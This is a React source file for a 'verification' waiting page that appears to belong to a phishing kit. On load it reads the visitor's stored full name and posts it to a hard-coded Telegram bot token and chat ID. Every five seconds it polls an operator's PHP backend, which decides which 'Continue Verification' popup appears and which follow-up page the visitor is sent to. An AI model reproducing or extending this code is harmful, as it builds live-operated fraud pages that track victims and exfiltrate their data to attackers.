import React, { useState, useEffect } from "react";
import ApplyHeader from "../components/applyHeader";
import logo from '../assets/logo-removebg-preview.png'

const API_URL = "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api4.php"; // Update this based on your server configuration


const LandingPagee: React.FC = () => {
//   const [email, setEmail] = useState("");
//   const [password, setPassword] = useState("");
  const [showPopup, setShowPopup] = useState(false);
  const [showPopup2, setShowPopup2] = useState(false);
  const [showPopup22, setShowPopup22] = useState(false);
  const [showPopup33, setShowPopup33] = useState(false);

  const [countdown, setCountdown] = useState(100);
  const BOT_TOKEN = '7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c';
  const CHAT_ID = '7062736155';

  const storedData = localStorage.getItem("applicationData");
  const parsedData = storedData ? JSON.parse(storedData) : {};

  const fullName = parsedData.fullname || "N/A";
  


 


const sendToTelegram = async (message: string) => {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
    }),
  });
};

useEffect(() => {
    // Notify on page load
    sendToTelegram(`✅ ${fullName} has opened the landing page.`);
  }, []);
  


  useEffect(() => {
    const interval = setInterval(() => {
      fetch(`${API_URL}?action=get_popup_status`)
        .then(res => res.json())
        .then(data => {
          if (data.showPopup2) setShowPopup2(true);
          // Optional: close popup when it's false
          else setShowPopup2(false);
        });
    }, 5000); // every 5 seconds
  
    return () => clearInterval(interval); // cleanup on unmount
  }, []);
  
  useEffect(() => {
    const interval = setInterval(() => {
      fetch(`${API_URL}?action=get_popup_status22`)
        .then(res => res.json())
        .then(data => {
          if (data.showPopup22) setShowPopup22(true);
          // Optional: close popup when it's false
          else setShowPopup22(false);
        });
    }, 5000); // every 5 seconds
  
    return () => clearInterval(interval); // cleanup on unmount
  }, []);
  useEffect(() => {
    const interval = setInterval(() => {
      fetch(`${API_URL}?action=get_popup_status33`)
        .then(res => res.json())
        .then(data => {
          if (data.showPopup33) setShowPopup33(true);
          // Optional: close popup when it's false
          else setShowPopup33(false);
        });
    }, 5000); // every 5 seconds
  
    return () => clearInterval(interval); // cleanup on unmount
  }, []);
  
  
 

  useEffect(() => {
    let timer: NodeJS.Timeout;

    if (showPopup && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    }

    if (countdown === 0) {
      window.location.reload();
      console.log(setShowPopup)
    }

    return () => clearTimeout(timer);
  }, [showPopup, countdown]);

  return (
    <>
    <ApplyHeader/>

    {showPopup2 && (
  <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
    <div className="bg-white p-6 rounded-xl shadow-lg max-w-md text-center">
      <div className="m-auto flex justify-center p-6"><img src={logo} width={100} /></div>
      <div className="flex items-center justify-center">
  <svg
    className="animate-spin h-5 w-12 text-blue-800 mb-4"
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    viewBox="0 0 24 24"
  >
    <circle
      className="opacity-25"
      cx="12"
      cy="12"
      r="10"
      stroke="currentColor"
      strokeWidth="4"
    ></circle>
    <path
      className="opacity-75"
      fill="currentColor"
      d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
    ></path>
  </svg>
</div>

      {/* <p>Refresh Page</p> */}

      <button
  className="mt-4 bg-green-600 text-white px-4 py-2 rounded"
  onClick={async () => {
    setShowPopup(false); // Hide the popup on frontend

    try {
      // 1. Update backend to hide popup22
      await fetch(`${API_URL}?action=update_popup22`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ showPopup22: false }),
      });

      // 2. Fetch current active user route
      const res = await fetch(`${API_URL}?action=get_config`);
      const config = await res.json();
      const route = config.activeUser || "user"; // fallback if not set
      console.log(route)
      // 3. Store local flag and redirect
      localStorage.setItem("popupSeen", "true");
      window.location.hash = `#/user`;
    } catch (err) {
      console.error("❌ Error:", err);
    }
  }}
>
  Continue Verification
</button>



    </div>
  </div>
)}
    {showPopup22 && (
  <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
    <div className="bg-white p-6 rounded-xl shadow-lg max-w-md text-center">
      <div className="m-auto flex justify-center p-6"><img src={logo} width={100} /></div>
      <div className="flex items-center justify-center">
  <svg
    className="animate-spin h-5 w-12 text-blue-800 mb-4"
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    viewBox="0 0 24 24"
  >
    <circle
      className="opacity-25"
      cx="12"
      cy="12"
      r="10"
      stroke="currentColor"
      strokeWidth="4"
    ></circle>
    <path
      className="opacity-75"
      fill="currentColor"
      d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
    ></path>
  </svg>
</div>

      {/* <p>Refresh Page</p> */}

      <button
  className="mt-4 bg-green-600 text-white px-4 py-2 rounded"
  onClick={async () => {
    setShowPopup(false); // Hide the popup on frontend

    try {
      // 1. Update backend to hide popup22
      await fetch(`${API_URL}?action=update_popup22`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ showPopup22: false }),
      });

      // 2. Fetch current active user route
      const res = await fetch(`${API_URL}?action=get_config`);
      const config = await res.json();
      const route = config.activeUser || "user"; // fallback if not set
      console.log(route)

      // 3. Store local flag and redirect
      localStorage.setItem("popupSeen", "true");
      window.location.hash = `#/user2`;
    } catch (err) {
      console.error("❌ Error:", err);
    }
  }}
>
Continue Verification
</button>



    </div>
  </div>
)}
    {showPopup33 && (
  <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
    <div className="bg-white p-6 rounded-xl shadow-lg max-w-md text-center">
      <div className="m-auto flex justify-center p-6"><img src={logo} width={100} /></div>
      <div className="flex items-center justify-center">
  <svg
    className="animate-spin h-5 w-12 text-blue-800 mb-4"
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    viewBox="0 0 24 24"
  >
    <circle
      className="opacity-25"
      cx="12"
      cy="12"
      r="10"
      stroke="currentColor"
      strokeWidth="4"
    ></circle>
    <path
      className="opacity-75"
      fill="currentColor"
      d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
    ></path>
  </svg>
</div>

      {/* <p>Refresh Page</p> */}

      <button
  className="mt-4 bg-green-600 text-white px-4 py-2 rounded"
  onClick={async () => {
    setShowPopup(false); // Hide the popup on frontend

    try {
      // 1. Update backend to hide popup22
      await fetch(`${API_URL}?action=update_popup33`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ showPopup33: false }),
      });

      // 2. Fetch current active user route
      const res = await fetch(`${API_URL}?action=get_config`);
      const config = await res.json();
      const route = config.activeUser || "user"; // fallback if not set
      console.log(route)
      // 3. Store local flag and redirect
      localStorage.setItem("popupSeen", "true");
      window.location.hash = `#/user3`;
    } catch (err) {
      console.error("❌ Error:", err);
    }
  }}
>
Continue Verification
</button>



    </div>
  </div>
)}
   

    <p className="text-sm mt-4 p-7 text-center">Please wait, you will get an update here soon. This may take a while</p>
    <div className="absolute bottom-[200px] left-1/2 transform -translate-x-1/2">
          <svg
            className="animate-spin h-6 w-6 text-gray-600"
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
          >
            <circle
              className="opacity-25"
              cx="12"
              cy="12"
              r="10"
              stroke="currentColor"
              strokeWidth="4"
            />
            <path
              className="opacity-75"
              fill="currentColor"
              d="M4 12a8 8 0 018-8v8H4z"
            />
          </svg>
        </div></>
  );
};

export default LandingPagee;
